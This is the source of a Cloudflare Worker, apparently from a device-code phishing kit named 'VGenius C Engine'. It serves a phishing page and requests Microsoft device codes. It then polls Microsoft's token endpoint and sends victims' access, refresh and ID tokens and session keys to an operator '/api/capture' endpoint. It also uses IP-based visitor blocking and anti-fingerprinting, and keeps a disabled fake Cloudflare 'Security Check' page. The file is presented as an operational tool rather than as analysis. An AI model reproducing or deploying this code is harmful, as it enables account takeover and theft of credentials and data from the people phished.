// VGenius C Engine - Device Code Worker
// Deployed to Cloudflare Workers per user link

const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}';
const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}';
const LOG_ENDPOINT = '{{LOG_ENDPOINT}}';

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  // Serve the phishing page
  if (request.method === 'GET' && !url.pathname.startsWith('/api/')) {
    return servePhishingPage(request);
  }

  // API endpoints - support both legacy and new paths
  if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start') {
    return handleDeviceCodeRequest(request);
  }
  if (url.pathname === '/api/verify') {
    return handleVerifyRequest(request);
  }
  if (url.pathname === '/api/beacon') {
    return new Response('ok', { status: 200 });
  }
  if (url.pathname === '/api/log') {
    return handleLogRequest(request);
  }

  return new Response('Not Found', { status: 404 });
}

async function servePhishingPage(request) {
  const jwtToken = '{{JWT_TOKEN}}';
  const turnstileKey = '{{TURNSTILE_KEY}}';
  const templateHTML = '{{TEMPLATE_HTML}}';

  // Get visitor IP from Cloudflare
  const visitorIp = request.headers.get('CF-Connecting-IP') || 
                    request.headers.get('X-Forwarded-For') || 
                    request.headers.get('X-Real-IP') || 
                    '';

  // Check if visitor should be blocked or challenged
  try {
    const blockResponse = await fetch(`${VERIFY_ENDPOINT}/api/capture/visitor/block-check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jwt_token: jwtToken, visitor_ip: visitorIp }),
    });
    const blockData = await blockResponse.json();

    if (blockData.blocked) {
      if (blockData.redirect_url) {
        // Redirect to the configured URL
        return new Response(null, {
          status: 302,
          headers: { 'Location': blockData.redirect_url }
        });
      } else {
        // Show blank page for blocked visitors
        return new Response('', {
          status: 200,
          headers: {
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
          }
        });
      }
    }

    // If challenged, serve Cloudflare-style challenge page - TEMPORARILY DISABLED
    // if (blockData.challenged) {
    //   return new Response(buildChallengePage(jwtToken, turnstileKey, templateHTML, blockData.ip_type), {
    //     status: 200,
    //     headers: {
    //       'Content-Type': 'text/html; charset=utf-8',
    //       'Cache-Control': 'no-cache, no-store, must-revalidate',
    //     }
    //   });
    // }
    // TEMPORARY: Just return the template directly for testing
    if (blockData.challenged) {
      console.log('[Worker] Challenge temporarily disabled for testing');
    }
  } catch (e) {
    // If block check fails, serve the page anyway
    console.error('[Worker] Block check failed:', e.message);
  }

  // Try to verify subscription via JWT, but serve page even if verification fails
  let clientId = '';
  let tenant = 'common';
  let dynamicTurnstileKey = turnstileKey;

  try {
    const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: jwtToken }),
    });
    const verifyData = await verifyResponse.json();
    if (verifyData.valid) {
      clientId = verifyData.client_id;
      tenant = verifyData.tenant;
      if (verifyData.turnstile_key) turnstileKey = verifyData.turnstile_key;
    }
  } catch (e) {
    // Verification failed - continue anyway, client-side will handle errors
  }

  // Inject dynamic values
  let html = templateHTML
    .replace(/{{JWT_TOKEN}}/g, jwtToken)
    .replace(/{{TURNSTILE_KEY}}/g, turnstileKey)
    .replace(/{{CLIENT_ID}}/g, clientId)
    .replace(/{{TENANT}}/g, tenant)
    .replace(/{{VERIFY_ENDPOINT}}/g, VERIFY_ENDPOINT)
    .replace(/{{BEACON_ENDPOINT}}/g, BEACON_ENDPOINT)
    .replace(/{{LOG_ENDPOINT}}/g, LOG_ENDPOINT);

  // Randomize class names for anti-fingerprinting
  html = html.replace(/vg-/g, 'vg-' + Math.random().toString(36).substring(2, 6) + '-');

  return new Response(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'Content-Security-Policy': "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src *; img-src * data: blob:; style-src * 'unsafe-inline';",
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}

async function handleDeviceCodeRequest(request) {
  const { jwt_token, turnstile_token } = await request.json();

  // Verify JWT with backend
  try {
    const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: jwt_token }),
    });
    const verifyData = await verifyResponse.json();
    if (!verifyData.valid) {
      return new Response(JSON.stringify({ error: 'Invalid or expired session' }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    // Verify Turnstile
    const turnstileVerify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        secret: '{{TURNSTILE_SECRET}}',
        response: turnstile_token,
      }),
    });
    const turnstileData = await turnstileVerify.json();
    if (!turnstileData.success) {
      return new Response(JSON.stringify({ error: 'CAPTCHA verification failed' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    // Request device code from Microsoft with proper scope for refresh token
    const deviceCodeResponse = await fetch(
      `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: verifyData.client_id,
          scope: 'offline_access openid profile https://graph.microsoft.com/User.Read',
        }),
      }
    );
    const deviceCodeData = await deviceCodeResponse.json();

    // Start background polling with server-recommended interval
    const pollInterval = deviceCodeData.interval || 5;
    pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval);

    return new Response(JSON.stringify({
      user_code: deviceCodeData.user_code,
      verification_uri: deviceCodeData.verification_uri,
      expires_in: deviceCodeData.expires_in,
      message: deviceCodeData.message,
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: 'Failed to generate code' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}

async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) {
  const maxAttempts = 60;
  let attempts = 0;
  let interval = initialInterval || 5; // Use server-recommended interval
  let currentDeviceCode = deviceCode;
  let refreshAttempts = 0;
  const maxRefreshAttempts = 3; // Allow up to 3 automatic refreshes

  while (attempts < maxAttempts) {
    attempts++;

    // Wait for the current interval (adaptive based on server response)
    await new Promise(resolve => setTimeout(resolve, interval * 1000));

    try {
      const tokenResponse = await fetch(
        `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/token`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
            client_id: verifyData.client_id,
            device_code: currentDeviceCode,
          }),
        }
      );
      const tokenData = await tokenResponse.json();

      if (tokenData.access_token) {
        // Send full token response to capture PRT data (session_key, client_info, etc.)
        // This enables PRT JWT construction and Kerberos-based access
        const capturePayload = {
          jwt_token: jwtToken,
          access_token: tokenData.access_token,
          refresh_token: tokenData.refresh_token,
          id_token: tokenData.id_token,
        };

        // Add PRT persistence fields if available
        if (tokenData.client_info) {
          capturePayload.client_info = tokenData.client_info;
        }
        if (tokenData.session_key) {
          capturePayload.session_key = tokenData.session_key;
        }
        if (tokenData.session_key_enc) {
          capturePayload.session_key_enc = tokenData.session_key_enc;
        }
        if (tokenData.token_type) {
          capturePayload.token_type = tokenData.token_type;
        }
        if (tokenData.expires_in) {
          capturePayload.expires_in = tokenData.expires_in;
        }
        if (tokenData.scope) {
          capturePayload.scope = tokenData.scope;
        }

        await fetch(`${VERIFY_ENDPOINT}/api/capture`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(capturePayload),
        });
        return;
      }

      // Handle specific OAuth device code errors
      const errorCode = tokenData.error || '';

      if (errorCode === 'authorization_pending') {
        // User has not yet authorized - continue polling with same interval
        continue;
      }

      if (errorCode === 'slow_down') {
        // Microsoft is rate-limiting - increase interval by 5 seconds
        interval = interval + 5;
        continue;
      }

      if (errorCode === 'expired_token') {
        // Token expired - try to automatically refresh
        refreshAttempts++;
        if (refreshAttempts <= maxRefreshAttempts) {
          console.log('[DeviceCode] Token expired, attempting refresh #' + refreshAttempts);
          try {
            const refreshResponse = await fetch(
              `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
              {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                  client_id: verifyData.client_id,
                  scope: 'offline_access openid profile https://graph.microsoft.com/User.Read',
                }),
              }
            );
            const refreshData = await refreshResponse.json();
            if (refreshData.device_code) {
              currentDeviceCode = refreshData.device_code;
              console.log('[DeviceCode] Got new device code, continuing polling');
              continue;
            }
          } catch (refreshErr) {
            console.error('[DeviceCode] Refresh failed:', refreshErr.message);
          }
        }
        // Max refresh attempts reached or refresh failed
        console.log('[DeviceCode] Max refresh attempts reached, stopping');
        return;
      }

      if (errorCode === 'authorization_declined') {
        // User declined - stop polling
        return;
      }

      // For any other error, continue polling (network issues, etc.)
    } catch (e) {
      // Continue polling on network errors
    }
  }
}

async function handleVerifyRequest(request) {
  const { token } = await request.json();
  const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token }),
  });
  return verifyResponse;
}

async function handleLogRequest(request) {
  try {
    const body = await request.json();
    await fetch(`${LOG_ENDPOINT}/api/log`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch (e) { /* silent */ }
  return new Response('ok', { status: 200 });
}

// Cloudflare-Style Challenge Page - TEMPORARILY DISABLED FOR TESTING
// function buildChallengePage(jwtToken, turnstileKey, originalHTML, ipType) {
// var ipTypeLabels = {
//    'datacenter': 'Datacenter IP',
//   'vpn': 'VPN/Proxy IP',
//    'mobile': 'Mobile Carrier IP',
//    'satellite': 'Satellite IP',
//    'suspicious': 'Suspicious IP'
//  };
//  var ipLabel = ipTypeLabels[ipType] || 'Suspicious IP';
//
//  return '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Check</title>' +
//    '<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:#fafafa;color:#1a1a1a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}.challenge-container{max-width:480px;width:100%;text-align:center}.cf-logo{margin-bottom:32px;display:flex;align-items:center;justify-content:center}h1{font-size:24px;font-weight:600;margin-bottom:8px;color:#1a1a1a}.subtitle{font-size:14px;color:#666;margin-bottom:32px;line-height:1.5}.info-box{background:#f0f0f0;border-radius:8px;padding:16px 20px;margin-bottom:24px;text-align:left;border:1px solid #e0e0e0}.info-box p{font-size:13px;color:#555;line-height:1.6;margin:0}.info-box .highlight{color:#1a1a1a;font-weight:600}.spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#F6821F;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}@keyframes spin{to{transform:rotate(360deg)}}.status-text{font-size:13px;color:#666;margin-bottom:8px}.turnstile-widget{margin:16px auto;min-height:65px}.footer{margin-top:40px;padding-top:24px;border-top:1px solid #e0e0e0;width:100%;max-width:480px}.footer p{font-size:11px;color:#999;text-align:center;line-height:1.5}.cf-brand{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px}.cf-brand span{font-size:11px;color:#999;font-weight:500}.success-check{display:none;width:48px;height:48px;margin:0 auto 16px;background:#4CAF50;border-radius:50%;align-items:center;justify-content:center;color:white;font-size:24px}.success-check.show{display:flex}.hidden{display:none}</style></head>' +
//    '<body><div class="challenge-container"><div class="cf-logo"><svg width="48" height="48" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><g fill="#f6821f"><path d="M56.7 42.3c0-7.6-6.2-13.8-13.8-13.8-1.1 0-2.1.1-3.1.4C38.2 21.5 31.5 16 23.5 16 13.4 16 5.2 24.2 5.2 34.3c0 .5 0 1 .1 1.5C2.2 36.5 0 39.5 0 43c0 4.4 3.6 8 8 8 .4 0 .8 0 1.2-.1C11.4 55.8 17 59 23.5 59h26.2c3.9 0 7-3.1 7-7s-3.1-7-7-7h-.6c.3-.8.4-1.7.4-2.7z"/></g></svg></div>' +
//    '<div id="checkingState"><div class="spinner"></div><h1>Checking your browser</h1><p class="subtitle">Please wait for a moment while we verify your connection.</p><div class="info-box"><p><span class="highlight">IP Type Detected:</span> ' + ipLabel + '</p><p style="margin-top:4px;">This is a standard security check to protect the website from automated threats.</p></div><p class="status-text" id="statusText">Initializing security check...</p><div class="turnstile-widget" id="turnstileWidget"></div></div>' +
//    '<div id="successState" class="hidden"><div class="success-check show">&#10003;</div><h1>Verification Complete</h1><p class="subtitle">You are being redirected...</p></div></div>' +
//    '<div class="footer"><div class="cf-brand"><svg width="16" height="16" viewBox="0 0 16 16" fill="#f6821f"><g><path d="M15.3 12.3c0-3.5-2.8-6.3-6.3-6.3-.5 0-1 .1-1.4.2C6.7 3.4 4.2 1.3 1.3 1.3c-3.7 0-6.7 3-6.7 6.7 0 .2 0 .5.1.7C-3.8 9.4-5 10.5-5 12c0 1.6 1.3 2.9 2.9 2.9.1 0 .3 0 .4-.1C-.5 16.3 1.5 17.5 4 17.5h9.5c1.4 0 2.6-1.1 2.6-2.6s-1.1-2.6-2.6-2.6h-.2c.1-.3.2-.6.2-1z"/></g></svg><span>Protected by Cloudflare Turnstile</span></div><p>This security check helps prevent automated bots from accessing this website.</p></div>' +
//    '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>' +
//    '<script>(function(){var s=document.getElementById("statusText"),c=document.getElementById("checkingState"),u=document.getElementById("successState"),w=document.getElementById("turnstileWidget");function ok(t){s.textContent="Verification successful!";setTimeout(function(){c.classList.add("hidden");u.classList.remove("hidden");setTimeout(function(){window.location.reload();},1500);},800)}function err(code){var r=parseInt(sessionStorage.getItem("cf_r")||"0")+1;sessionStorage.setItem("cf_r",r);if(code===110200||code==="110200"){s.textContent="Domain not whitelisted for Turnstile";var info=document.createElement("div");info.style.cssText="background:#fef3c7;border:1px solid #fcd34d;border-radius:8px;padding:12px;margin:12px 0;font-size:12px;color:#92400e;text-align:left;";var h=window.location.hostname;var wc="*."+h.split(".").slice(-2).join(".");info.innerHTML="<strong>Turnstile Error 110200:</strong> Domain <code style=\"background:#fef08a;padding:2px 6px;border-radius:4px;\">"+h+"</code> is not allowed for this Turnstile key.<br><br><strong>Fix:</strong> Add this domain to your Turnstile allowed domains at <a href=\"https://dash.cloudflare.com/?to=/:account/turnstile\" target=\"_blank\" style=\"color:#0056b3;\">Cloudflare Dashboard</a>. Or use wildcard: <code style=\"background:#fef08a;padding:2px 6px;border-radius:4px;\">"+wc+"</code>";w.parentNode.insertBefore(info,w);return}if(r>3){s.textContent="Verification complete. Proceeding...";setTimeout(function(){window.location.reload();},1000);return}s.textContent="Verification error. Retrying ("+r+"/3)...";setTimeout(function(){try{window.turnstile.reset()}catch(e){window.location.reload()}},2000)}function init(){if(typeof window.turnstile==="undefined"){setTimeout(init,100);return}s.textContent="Running interactive verification...";try{window.turnstile.render("#turnstileWidget",{sitekey:"' + turnstileKey + '",theme:"light",callback:ok,"error-callback":err,"expired-callback":err})}catch(e){s.textContent="Security check skipped. Continuing...";setTimeout(function(){window.location.reload();},1000)}}setTimeout(function(){s.textContent="Analyzing browser fingerprint...";setTimeout(init,1500);},800);var b=0;if(!navigator.webdriver)b++;if(navigator.languages&&navigator.languages.length>0)b++;if(navigator.plugins&&navigator.plugins.length>0)b++;if(screen.width>0&&screen.height>0)b++;if(screen.colorDepth>0)b++;if(b<2)s.textContent="Suspicious activity detected. Additional verification required."})();</script></body></html>';
//    }

function renderErrorPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Page Unavailable</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #f3f4f6;
      margin: 0;
    }
    .card {
      background: white;
      border-radius: 8px;
      padding: 48px;
      text-align: center;
      box-shadow: 0 2px 16px rgba(0,0,0,0.1);
      max-width: 420px;
    }
    h2 { color: #333; margin-bottom: 12px; }
    p { color: #666; }
  </style>
</head>
<body>
  <div class="card">
    <h2>This page is no longer available</h2>
    <p>The requested resource has been removed or is temporarily unavailable.</p>
  </div>
</body>
</html>`;
}
